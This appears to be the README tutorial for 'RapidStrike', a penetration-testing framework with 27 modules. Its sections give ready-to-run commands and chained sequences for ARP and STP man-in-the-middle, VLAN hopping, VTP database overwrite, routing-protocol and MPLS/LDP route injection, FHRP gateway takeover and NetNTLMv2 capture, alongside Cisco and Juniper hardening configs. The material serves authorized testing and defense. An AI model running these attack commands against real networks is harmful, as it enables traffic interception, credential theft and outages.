# RapidStrike — Tutorial & Reference Guide

> Bear Net RapidStrike — Layer 2 / Routing Assessment Framework
> 27 modules · Authorized engagement use only · Every run is logged

---

## Table of Contents

- [Section 1 — Prerequisites & Lab Setup](#section-1-prerequisites--lab-setup)
- [Section 2 — Architecture Overview](#section-2-architecture-overview)
- [Section 3 — First Run: Preflight Recon](#section-3-first-run-preflight-recon)
- [Section 4 — Module Reference (27 Modules)](#section-4-module-reference-27-modules)
- [Section 5 — Cheat-Sheet: Three Parameters Per Module](#section-5-cheat-sheet--three-parameters-per-module)
- [Section 6 — Attack Chains](#section-6-attack-chains)
- [Section 7 — L2 MITM Attacks](#section-7-l2-mitm-attacks)
- [Section 8 — VLAN Attacks](#section-8-vlan-attacks)
- [Section 9 — Routing Protocol Attacks](#section-9-routing-protocol-attacks)
- [Section 10 — MPLS / LDP Attacks](#section-10-mpls--ldp-attacks)
- [Section 11 — FHRP Takeover](#section-11-fhrp-takeover)
- [Section 12 — Hardening: Cisco & Juniper with Notes](#section-12-hardening--cisco--juniper-with-notes)
- [Section 13 — Other Vendor Hardening Keywords](#section-13-other-vendor-hardening-keywords)
- [Section 14 — Audit Log & Reporting](#section-14-audit-log--reporting)
- [Section 15 — Troubleshooting](#section-15-troubleshooting)

---

## Section 1 — Prerequisites & Lab Setup

### System Requirements

| Need | Details |
|------|---------|
| OS | Linux (Kali / Ubuntu 22.04+), Python 3.9+ |
| Packages | `pip install scapy --break-system-packages` |
| Privileges | root / `CAP_NET_RAW` (raw sockets) |
| NIC | Must be in the target VLAN, promiscuous mode on |
| Lab | GNS3 / EVE-NG + IOS 15.x / JunOS for validation |

### Lab Topology (Recommended)

```
┌──────────┐       trunk        ┌──────────┐       trunk        ┌──────────┐
│ Attacker │◄──────802.1Q──────►│ SW-Core  │◄──────802.1Q──────►│ SW-Acc   │
│ (Kali)   │   eth0             │ L3 Switch│                    │ L2 Switch│
└──────────┘                    └────┬─────┘                    └────┬─────┘
                                     │ L3                            │
                                ┌────┴─────┐                   ┌────┴─────┐
                                │ Router   │                   │ Victims  │
                                │ (OSPF/BGP│                   │ (DHCP)   │
                                │  MPLS)   │                   └──────────┘
                                └──────────┘
```

### Pre-engagement Checklist

1. Written RoE / SoW signed by customer
2. Target scope defined: VLANs, subnets, device IPs
3. Lab validation completed for each module planned
4. Backup of target switch/router configs (customer's responsibility)
5. Emergency rollback plan documented

---

## Section 2 — Architecture Overview

```
rapidstrike.py          ← CLI dispatcher (argparse)
├── core/
│   ├── authz.py        ← Engagement metadata + audit trail
│   ├── common.py       ← require_root(), iface_mac(), resolve_mac(), ip_forward()
│   ├── logging_util.py ← Structured logger with engagement prefix
│   ├── rawsock.py      ← AF_PACKET raw socket helpers (Linux)
│   └── preflight.py    ← Passive L2 recon (also exposed as module)
└── modules/
    ├── __init__.py     ← Registry: MODULES list, register()/run() per module
    ├── arp.py          ← 27 attack modules, each with:
    ├── bgp.py          ←   NAME, DESCRIPTION, ATTCK_ID
    ├── ...             ←   register(subparsers, add_engagement_args)
    └── vtp.py          ←   run(args, logger)
```

Every module follows the same contract:

```python
NAME = "module-name"
DESCRIPTION = "One-line description"
ATTCK_ID = "T1557"      # MITRE ATT&CK mapping

def register(subparsers, add_engagement_args):
    # Define CLI arguments
    p = subparsers.add_parser(NAME, ...)
    p.add_argument("-i", "--interface", required=True)
    add_engagement_args(p)   # --engagement-id, --operator, --client
    p.set_defaults(func=run)

def run(args, logger):
    from core.common import require_root
    require_root()
    # Attack logic here
    return 0  # success
```

---

## Section 3 — First Run: Preflight Recon

Always run `preflight` before any attack module. It probes for active L2 defenses:

```bash
sudo python3 rapidstrike.py preflight -i eth0 \
  --gateway 192.168.1.1 \
  --engagement-id RoE-2026-001 \
  --operator johto \
  --client ACME
```

Preflight checks:
- **BPDU Guard**: Sends a test BPDU — if port goes err-disable, BPDU Guard is active (good defense)
- **DAI (Dynamic ARP Inspection)**: Sends a gratuitous ARP — if dropped, DAI is on
- **Port Security**: Monitors MAC count on the port
- **DHCP Snooping**: Probes for DHCP trust state

Results tell you which attacks are viable and which defenses are already in place.

---

## Section 4 — Module Reference (27 Modules)

### Reconnaissance

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 1 | `preflight` | — | Passive L2 mitigation recon — BPDU/DAI/port-security probe |

### L2 Switching Attacks

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 2 | `arp` | T1557.002 | Bidirectional ARP cache poisoning — transparent MITM |
| 3 | `cam` | T1499 | CAM table overflow via raw socket — force switch into hub mode |
| 4 | `cdp` | T1557 | CDP neighbor flooding — exhaust table, spike CPU |
| 5 | `dhcp` | T1557.003 | Rogue DHCP server — redirect gateway and DNS |
| 6 | `dhcp-starve` | T1499 | DHCP pool exhaustion — parallel threaded random MACs |
| 7 | `dvlan` | T1599 | Double 802.1Q tagging — hop into isolated VLAN |
| 8 | `impers` | T1557 | L2 impersonation — CAM + ARP combined for host takeover |
| 9 | `lldp` | T1557 | LLDP neighbor spoofing — overwrite switch neighbor table |
| 10 | `mac` | T1036.005 | MAC address spoofing with optional vendor OUI |
| 11 | `mstp` | T1557 | MSTP root bridge spoofing via raw IEEE 802.1s BPDU |
| 12 | `pvlan` | T1599 | Private VLAN bypass — isolated / community / promiscuous |
| 13 | `stp` | T1557 | STP root bridge spoofing — MITM entire L2 segment |
| 14 | `swspoof` | T1557 | Switch spoofing via LLDP — trigger DTP trunk negotiation |
| 15 | `vlan` | T1599 | VLAN scan — probe reachable VLANs via double-tag |
| 16 | `vtp` | T1599.001 | VTP VLAN database injection — overwrite domain VLAN DB |

### Routing Protocol Attacks

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 17 | `bgp` | T1557 | BGP route hijacking — subprefix or origin-AS injection |
| 18 | `eigrp` | T1557 | EIGRP route injection — forged internal route TLV |
| 19 | `ospf` | T1557 | OSPF disguised LSA injection — bypass fightback mechanism |
| 20 | `rip` | T1565.002 | RIPv2 route injection with plaintext / MD5 auth |

### FHRP (First-Hop Redundancy)

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 21 | `hsrp` | T1557 | HSRP Active takeover via spoofed Coup message |
| 22 | `vrrp` | T1557 | VRRP Master spoofing — VRID takeover via priority 255 |

### IPv6 / Name Resolution

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 23 | `ra` | T1557 | IPv6 RA spoofing (SLAAC) — v6 gateway MITM |
| 24 | `icmp-redir` | T1557 | ICMP Redirect injection — steer host route |
| 25 | `llmnr` | T1557.001 | LLMNR/mDNS/NBT-NS poisoner — NetNTLMv2 capture |

### MPLS / LDP

| # | Module | ATT&CK | Description |
|---|--------|--------|-------------|
| 26 | `mpls` | T1557 | MPLS LDP discover + label-stack inject (VRF hop) |
| 27 | `ldp` | T1557 | LDP label-mapping injection — poison LFIB directly |

---

## Section 5 — Cheat-Sheet: Three Parameters Per Module

Every module needs at minimum: **interface**, **engagement args**, and **one target parameter**.

```bash
# Template
sudo python3 rapidstrike.py <MODULE> -i <IFACE> [module-specific] \
  --engagement-id <ROE-ID> --operator <NAME> --client <CLIENT>
```

### Quick Reference

```bash
# ── Recon ──────────────────────────────────────────────────────────────────
preflight    -i eth0 --gateway 192.168.1.1

# ── L2 MITM ───────────────────────────────────────────────────────────────
arp          -i eth0 -t 192.168.1.100 -g 192.168.1.1
impers       -i eth0 -t 192.168.1.100 -g 192.168.1.1
icmp-redir   -i eth0 --victim 192.168.1.100 --gateway 192.168.1.1 --redirect-to 192.168.1.50

# ── L2 Infra ──────────────────────────────────────────────────────────────
cam          -i eth0 --count 50000
stp          -i eth0 --count 100
mstp         -i eth0 --count 100
mac          -i eth0 --target-mac 00:11:22:33:44:55

# ── VLAN ───────────────────────────────────────────────────────────────────
dvlan        -i eth0 --outer-vlan 1 --inner-vlan 100 --target 10.0.100.1
vlan         -i eth0 --outer-vlan 1 --vlan-range 2-200
pvlan        -i eth0 --mode isolated --target 10.0.0.50
swspoof      -i eth0
vtp          -i eth0 --mode scan
vtp          -i eth0 --mode inject --domain CORP --vlans 1,666 --revision 99999

# ── DHCP ───────────────────────────────────────────────────────────────────
dhcp-starve  -i eth0 --count 200
dhcp         -i eth0 --gateway 192.168.1.50 --dns 192.168.1.50 --pool-start 192.168.1.100

# ── Discovery ─────────────────────────────────────────────────────────────
cdp          -i eth0 --count 500
lldp         -i eth0 --count 200

# ── FHRP ──────────────────────────────────────────────────────────────────
hsrp         -i eth0 --group 1 --virtual-ip 192.168.1.1
vrrp         -i eth0 --vrid 1 --virtual-ip 192.168.1.1

# ── Routing ────────────────────────────────────────────────────────────────
ospf         -i eth0 --area 0 --router-id 1.1.1.1 --network 10.0.0.0/24
bgp          -i eth0 --target-ip 10.0.0.1 --target-asn 65001 --local-asn 65999 --prefix 10.10.0.0/25
eigrp        -i eth0 --asn 100 -n 10.0.0.0/24 -s 192.168.1.50
rip          -i eth0 --network 10.0.0.0/24 --next-hop 192.168.1.50

# ── IPv6 / Name ───────────────────────────────────────────────────────────
ra           -i eth0 --prefix 2001:db8:dead::/64
llmnr        -i eth0 --spoof-ip 192.168.1.50

# ── MPLS / LDP ────────────────────────────────────────────────────────────
mpls         -i eth0 --mode scan
mpls         -i eth0 --mode inject --label 100 --target-ip 10.0.0.1
ldp          -i eth0 --mode scan
ldp          -i eth0 --mode inject --target 10.255.255.2 --fec 10.0.0.0/24 --label 1000
```

### Global Options (All Modules)

| Flag | Description |
|------|-------------|
| `--engagement-id` | RoE / engagement reference ID |
| `--operator` | Operator name (your handle) |
| `--client` | Customer / target organization |
| `--scope-note` | Free-text scope note (logged) |
| `--dry-run` | Preview packets, do not send (most modules) |
| `--verbose` / `-v` | Verbose Scapy output |
| `--count` / `-c` | Number of packets / iterations |
| `--log` | Audit log path (default: `rapidstrike_audit.log`) |

---

## Section 6 — Attack Chains

RapidStrike modules are designed to chain together. Common sequences:

### Chain 1: DHCP Takeover (Gateway MITM)

```
dhcp-starve → dhcp → arp (optional)
```

1. `dhcp-starve` — exhaust legitimate DHCP pool
2. `dhcp` — serve rogue DHCP with attacker as gateway/DNS
3. `arp` — poison existing clients that already have leases

### Chain 2: VLAN Hopping

```
swspoof → dvlan or vlan
```

1. `swspoof` — force port into trunk mode via DTP negotiation
2. `dvlan` — double-tag frames to reach target VLAN

### Chain 3: VTP VLAN Takeover

```
vtp (scan) → vtp (inject) → dvlan
```

1. `vtp --mode scan` — discover VTP domain name and revision
2. `vtp --mode inject` — overwrite VLAN database with rogue VLANs
3. `dvlan` — hop into newly created VLANs

### Chain 4: STP Root Bridge → Full Segment MITM

```
preflight → stp → (passive capture)
```

1. `preflight` — check if BPDU Guard is active
2. `stp` — claim root bridge, all traffic traverses attacker port
3. Enable IP forwarding for transparent MITM

### Chain 5: MPLS/LDP Label Hijack

```
mpls (scan) → ldp (scan) → ldp (inject)
```

1. `mpls --mode scan` — confirm MPLS is active on segment
2. `ldp --mode scan` — discover LDP peers and transport addresses
3. `ldp --mode inject` — poison LFIB with forged label bindings

### Chain 6: Routing Protocol Hijack

```
preflight → ospf|eigrp|bgp|rip → (traffic interception)
```

1. `preflight` — baseline assessment
2. Choose protocol module matching the target's routing:
   - `ospf` for OSPF domains (disguised LSA)
   - `eigrp` for Cisco EIGRP (route injection)
   - `bgp` for BGP peering (subprefix hijack)
   - `rip` for RIPv2 networks (low-metric injection)

### Chain 7: FHRP Gateway Hijack

```
hsrp|vrrp → (transparent MITM)
```

1. Sniff for HSRP (UDP/1985) or VRRP (proto 112) to learn group/VRID
2. `hsrp` or `vrrp` — take over Active/Master role
3. Attacker owns virtual gateway IP → all default-route traffic

---

## Section 7 — L2 MITM Attacks

### ARP Cache Poisoning (`arp`)

**How it works**: Sends gratuitous ARP replies to both victim and gateway, mapping the other's IP to the attacker's MAC. Both update their ARP cache → traffic flows through attacker.

```bash
sudo python3 rapidstrike.py arp -i eth0 \
  -t 192.168.1.100 -g 192.168.1.1 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**What to observe**:
- Victim's ARP cache: gateway MAC = attacker MAC
- Gateway's ARP cache: victim MAC = attacker MAC
- Wireshark: see traffic from both sides passing through attacker

**Defense check**: If DAI is on, gratuitous ARP is dropped and attack fails silently.

### CAM Table Overflow (`cam`)

**How it works**: Floods random source MACs to overflow the switch CAM table. Fail-open switches broadcast all frames out every port (hub mode).

```bash
sudo python3 rapidstrike.py cam -i eth0 --count 50000 --threads 4 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**What to observe**:
- `show mac address-table count` on switch: table near max
- Wireshark on attacker: seeing frames not destined for attacker = hub mode achieved

**Defense check**: Port Security limits source MACs per port. If active, excess MACs are dropped/port disabled.

### STP Root Bridge Spoofing (`stp`)

**How it works**: Sends BPDUs with bridge priority 0 → wins root election → all L2 traffic must transit attacker's port.

```bash
sudo python3 rapidstrike.py stp -i eth0 --count 100 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**What to observe**:
- `show spanning-tree` on switch: attacker is root bridge
- Brief traffic disruption during reconvergence (~30s for classic STP)

**Defense check**: BPDU Guard puts port in err-disable immediately on receiving a BPDU from an access port.

---

## Section 8 — VLAN Attacks

### Double VLAN Tagging (`dvlan`)

**How it works**: Sends frames with two 802.1Q tags. The access switch strips the outer tag (native VLAN) and forwards the inner-tagged frame into the target VLAN.

**Prerequisite**: Attacker must be on the native VLAN (usually VLAN 1).

```bash
sudo python3 rapidstrike.py dvlan -i eth0 \
  --outer-vlan 1 --inner-vlan 100 --target 10.0.100.1 -c 50 \
  --engagement-id RoE-001 --operator johto --client ACME
```

### VTP Database Injection (`vtp`)

**How it works**: VTP (VLAN Trunking Protocol) synchronizes VLAN databases across all switches in a domain. A switch with a higher configuration revision number wins — all others overwrite their VLAN database with the winner's.

**Step 1 — Scan** (safe, passive):

```bash
sudo python3 rapidstrike.py vtp -i eth0 --mode scan --timeout 30 \
  --engagement-id RoE-001 --operator johto --client ACME
```

Output reveals: domain name, VTP version, current revision number.

**Step 2 — Inject** (destructive — lab first):

```bash
sudo python3 rapidstrike.py vtp -i eth0 --mode inject \
  --domain CORP --revision 99999 --vlans 1,666 \
  --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

Remove `--dry-run` after lab validation. Result: every VTP Client/Server switch replaces its VLAN database → ports on deleted VLANs go down.

**Defense check**: VTP Transparent mode, VTPv3 primary-server lock, VTP password.

### Switch Spoofing (`swspoof`)

**How it works**: Broadcasts LLDP frames with Cisco OUI, triggering DTP trunk negotiation on misconfigured ports → port becomes trunk → access to all VLANs.

```bash
sudo python3 rapidstrike.py swspoof -i eth0 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Defense check**: `switchport mode access` + `switchport nonegotiate` on all access ports.

---

## Section 9 — Routing Protocol Attacks

### OSPF Disguised LSA Injection (`ospf`)

**How it works**: Injects a Router-LSA that appears to originate from the victim router. Uses checksum collision (Nakibly et al.) to defeat OSPF's fightback mechanism — the real router's fightback LSA is discarded as a duplicate.

```bash
sudo python3 rapidstrike.py ospf -i eth0 \
  --area 0 --router-id 1.1.1.1 --network 10.0.0.0/24 \
  --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Defense check**: OSPF MD5/HMAC-SHA authentication, passive-interface on access segments.

### BGP Route Hijacking (`bgp`)

**How it works**: Establishes a real BGP session with the target router and sends UPDATE messages advertising a more-specific prefix (subprefix) or the same prefix from a different origin AS.

```bash
sudo python3 rapidstrike.py bgp -i eth0 \
  --target-ip 10.0.0.1 --target-asn 65001 --local-asn 65999 \
  --prefix 10.10.0.0/25 --mode subprefix \
  --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Defense check**: BGP MD5 authentication, prefix-list / route-map filtering, RPKI/ROA validation.

### EIGRP Route Injection (`eigrp`)

**How it works**: Forges EIGRP Hello + Internal Route TLV with a low delay metric (wins DUAL best path) to pull traffic for a target prefix through the attacker.

```bash
sudo python3 rapidstrike.py eigrp -i eth0 \
  --asn 100 -n 10.0.0.0/24 -s 192.168.1.50 --router-id 1.1.1.1 \
  --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Prerequisites**: Must match the target EIGRP AS number and K-values.

**Defense check**: EIGRP MD5/HMAC-SHA authentication, passive-interface, distribute-list filtering.

### RIPv2 Route Injection (`rip`)

**How it works**: Advertises a route with metric 1 (lowest) to the RIPv2 multicast group (224.0.0.9). Supports plaintext and MD5 authentication.

```bash
sudo python3 rapidstrike.py rip -i eth0 \
  --network 10.0.0.0/24 --next-hop 192.168.1.50 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Defense check**: RIPv2 MD5 authentication, passive-interface, prefix filtering.

---

## Section 10 — MPLS / LDP Attacks

### MPLS Label-Stack Inject (`mpls`)

**How it works**: Two modes: `scan` passively listens for MPLS ethertypes (0x8847/0x8848) and LDP hellos; `inject` sends frames with a forged MPLS label stack to test whether the PE router accepts arbitrary labels.

```bash
# Step 1: Scan for MPLS activity
sudo python3 rapidstrike.py mpls -i eth0 --mode scan --timeout 20 \
  --engagement-id RoE-001 --operator johto --client ACME

# Step 2: Inject label-stack (lab only)
sudo python3 rapidstrike.py mpls -i eth0 --mode inject \
  --label 100 --target-ip 10.0.0.1 -c 50 --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

### LDP Label-Mapping Injection (`ldp`)

**How it works**: Unlike `mpls` (which injects MPLS-encapsulated L2 frames), `ldp` targets the LDP control plane directly. It forges LDP Hello messages to establish adjacency, then sends Label-Mapping messages to bind a fake FEC (prefix) to an attacker-controlled label in the target's LFIB.

```bash
# Step 1: Discover LDP peers
sudo python3 rapidstrike.py ldp -i eth0 --mode scan --timeout 20 \
  --engagement-id RoE-001 --operator johto --client ACME

# Step 2: Inject label mapping (lab only)
sudo python3 rapidstrike.py ldp -i eth0 --mode inject \
  --target 10.255.255.2 --lsr-id 10.255.255.1 \
  --fec 10.0.0.0/24 --label 1000 \
  --dry-run \
  --engagement-id RoE-001 --operator johto --client ACME
```

**What to observe on target**:
- `show mpls ldp bindings` — forged label binding appears
- `show mpls forwarding-table` — LFIB entry for the injected FEC
- If label is accepted → traffic for that FEC is redirected
- If dropped → LDP MD5 auth or label filtering is active (good finding)

**Defense check**: LDP MD5 authentication, `mpls label range` filtering, TTL-security, MPLS only on trusted core links.

---

## Section 11 — FHRP Takeover

### HSRP Active Takeover (`hsrp`)

**How it works**: Sends an HSRP Coup message with priority 255 to claim Active role. The real Active demotes to Standby. Attacker responds to ARP for the virtual IP.

```bash
sudo python3 rapidstrike.py hsrp -i eth0 \
  --group 1 --virtual-ip 192.168.1.1 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Prerequisites**: Sniff UDP/1985 first to learn HSRP group and virtual IP. Default auth = "cisco" (plaintext).

**Defense check**: HSRP MD5 authentication, priority + preempt hardening.

### VRRP Master Spoofing (`vrrp`)

**How it works**: Sends VRRP advertisements with priority 255 to win Master election. Backup routers demote. Attacker owns virtual IP/MAC (00:00:5e:00:01:XX).

```bash
sudo python3 rapidstrike.py vrrp -i eth0 \
  --vrid 1 --virtual-ip 192.168.1.1 \
  --engagement-id RoE-001 --operator johto --client ACME
```

**Defense check**: VRRP authentication, `accept-mode off`, priority hardening.

---

## Section 12 — Hardening: Cisco & Juniper with Notes

### Cisco IOS / IOS-XE

```
! ── L2 Hardening ──────────────────────────────────────────────────────────
! Port Security (vs cam, mac)
interface range GigabitEthernet0/1-48
 switchport mode access
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation shutdown
 switchport port-security aging time 5

! BPDU Guard (vs stp, mstp)
 spanning-tree bpduguard enable
 spanning-tree portfast

! DTP Disable (vs swspoof)
 switchport nonegotiate

! Storm Control (vs cam)
 storm-control broadcast level 10
 storm-control action shutdown

! DHCP Snooping (vs dhcp, dhcp-starve)
ip dhcp snooping
ip dhcp snooping vlan 1-4094
interface GigabitEthernet0/48
 ip dhcp snooping trust      ! uplink to real DHCP server only

! DAI (vs arp)
ip arp inspection vlan 1-4094
interface GigabitEthernet0/48
 ip arp inspection trust

! IP Source Guard (vs impers, mac)
interface range GigabitEthernet0/1-47
 ip verify source

! VTP Hardening (vs vtp)
vtp mode transparent           ! or VTPv3 with primary server lock
vtp password S3cur3VTP!

! ── Routing Hardening ─────────────────────────────────────────────────────
! OSPF Auth (vs ospf)
router ospf 1
 area 0 authentication message-digest
interface GigabitEthernet0/0
 ip ospf message-digest-key 1 md5 0 S3cur3OSPF!

! EIGRP Auth (vs eigrp)
key chain EIGRP-KEY
 key 1
  key-string S3cur3EIGRP!
interface GigabitEthernet0/0
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP-KEY

! BGP Auth (vs bgp)
router bgp 65001
 neighbor 10.0.0.2 password S3cur3BGP!

! RIP Auth (vs rip)
key chain RIP-KEY
 key 1
  key-string S3cur3RIP!
interface GigabitEthernet0/0
 ip rip authentication mode md5
 ip rip authentication key-chain RIP-KEY

! HSRP Auth (vs hsrp)
interface GigabitEthernet0/0
 standby 1 authentication md5 key-string S3cur3HSRP!

! MPLS / LDP Auth (vs mpls, ldp)
mpls ldp neighbor 10.0.0.2 password S3cur3LDP!

! CDP Disable on access ports (vs cdp)
interface range GigabitEthernet0/1-47
 no cdp enable

! LLDP Disable on access ports (vs lldp)
 no lldp transmit
 no lldp receive
```

### Juniper JunOS

```
# ── L2 Hardening ──────────────────────────────────────────────────────────
# Port Security / MAC Limiting (vs cam, mac)
set ethernet-switching-options secure-access-port interface ge-0/0/0 mac-limit 2
set ethernet-switching-options secure-access-port interface ge-0/0/0 mac-limit action drop

# BPDU Guard (vs stp, mstp)
set protocols rstp interface ge-0/0/0 bpdu-block-on-edge

# DHCP Snooping (vs dhcp, dhcp-starve)
set vlans default forwarding-options dhcp-security
set vlans default forwarding-options dhcp-security group trusted interface ge-0/0/47.0

# DAI (vs arp)
set vlans default forwarding-options dhcp-security arp-inspection

# Storm Control (vs cam)
set interfaces ge-0/0/0 unit 0 family ethernet-switching storm-control default

# ── Routing Hardening ─────────────────────────────────────────────────────
# OSPF Auth (vs ospf)
set protocols ospf area 0.0.0.0 interface ge-0/0/0 authentication md5 1 key S3cur3OSPF!

# BGP Auth (vs bgp)
set protocols bgp group EBGP neighbor 10.0.0.2 authentication-key S3cur3BGP!

# LDP Auth (vs ldp, mpls)
set protocols ldp session 10.0.0.2 authentication-key S3cur3LDP!

# LLDP Disable on access (vs lldp)
set protocols lldp interface ge-0/0/0 disable

# RA Guard (vs ra)
set forwarding-options access-security ra-guard
```

---

## Section 13 — Other Vendor Hardening Keywords

For vendors not shown in Section 12, search for these keywords in the vendor's documentation:

| Attack | Search Keywords |
|--------|----------------|
| ARP spoof | Dynamic ARP Inspection, ARP protection, trusted port |
| CAM flood | MAC limiting, port security, MAC learning limit |
| STP spoof | BPDU Guard, BPDU protection, root guard |
| DHCP rogue | DHCP snooping, DHCP guard, trusted server |
| VLAN hop | trunk allowed VLAN, native VLAN tagging, DTP disable |
| VTP inject | VTP transparent, VTP off, VTP authentication |
| OSPF/EIGRP/BGP/RIP | routing authentication MD5, neighbor password |
| HSRP/VRRP | FHRP authentication, standby md5, vrrp auth |
| MPLS/LDP | LDP session password, LDP authentication, label filter |
| CDP/LLDP | disable CDP/LLDP on access, no cdp enable |
| RA spoof | RA Guard, IPv6 RA snooping, SEND |

Vendor docs:
- **Aruba/HPE**: ArubaOS-CX Security Guide → "port-access" / "loop-protect"
- **Huawei**: CloudEngine config → "dhcp snooping" / "arp anti-attack" / "bpdu-protection"
- **MikroTik**: RouterOS wiki → "bridge filter" / "DHCP snooping" / "port isolation"

---

## Section 14 — Audit Log & Reporting

Every module run writes to `rapidstrike_audit.log` (or `--log <path>`):

```
2026-10-20T09:30:00+07:00 [eng=RoE-2026-001 op=johto client=ACME] START | technique=T1557.002 | iface=eth0 | target=192.168.1.100
2026-10-20T09:30:15+07:00 [eng=RoE-2026-001 op=johto client=ACME] END | success=True
```

### Including in Pentest Reports

1. Attach `rapidstrike_audit.log` as evidence appendix
2. Reference module name + ATT&CK ID per finding:
   - "ARP Cache Poisoning (T1557.002) — No Dynamic ARP Inspection configured"
3. Include `--dry-run` output as proof-of-concept screenshots
4. Map each finding to the defense recommendation (Section 12)

### Log Fields

| Field | Description |
|-------|-------------|
| timestamp | ISO 8601 with timezone |
| eng | Engagement / RoE ID |
| op | Operator name |
| client | Customer organization |
| technique | MITRE ATT&CK ID |
| iface | Interface used |
| success | Attack succeeded (True/False) |

---

## Section 15 — Troubleshooting

### Common Issues

| Problem | Cause | Fix |
|---------|-------|-----|
| `[!] Root privileges are required` | Not running as root | `sudo python3 rapidstrike.py ...` |
| `[!] scapy is required` | Scapy not installed | `pip install scapy --break-system-packages` |
| ARP module has no effect | DAI is enabled (good!) | Report as "DAI active — finding: PASS" |
| STP module — port goes err-disable | BPDU Guard active (good!) | Report as "BPDU Guard active — finding: PASS" |
| VTP inject — no change on peers | VTP password set or VTPv3 primary lock | Report as "VTP auth — finding: PASS" |
| LDP inject — no LFIB entry | LDP MD5 auth or label filter active | Report as "LDP auth — finding: PASS" |
| EIGRP inject — no route change | AS number mismatch or EIGRP auth | Verify ASN with `show ip eigrp neighbors` |
| BGP module — TCP RST received | BGP MD5 authentication active | Report as "BGP MD5 — finding: PASS" |
| CAM flood — no hub mode | Port security dropping excess MACs | Lower `--count`, observe `show port-security` |
| `OSError: [Errno 19] No such device` | Interface name wrong | Check `ip link show` for correct name |
| `OSError: [Errno 1] Operation not permitted` | Missing CAP_NET_RAW | Run as root or `setcap cap_net_raw+ep` |

### Defense Detection = Positive Finding

A module that **fails** often means the defense is **working**:

| Module fails because... | Report finding |
|-------------------------|---------------|
| DAI drops ARP | **PASS** — DAI correctly mitigates ARP spoof |
| BPDU Guard disables port | **PASS** — BPDU Guard correctly blocks STP spoof |
| Port Security triggers | **PASS** — Port Security limits MAC learning |
| OSPF MD5 rejects LSA | **PASS** — OSPF authentication prevents route injection |
| VTP password blocks injection | **PASS** — VTP authentication active |
| LDP MD5 rejects binding | **PASS** — LDP authentication prevents LFIB poison |

Always run `--dry-run` first in production environments.
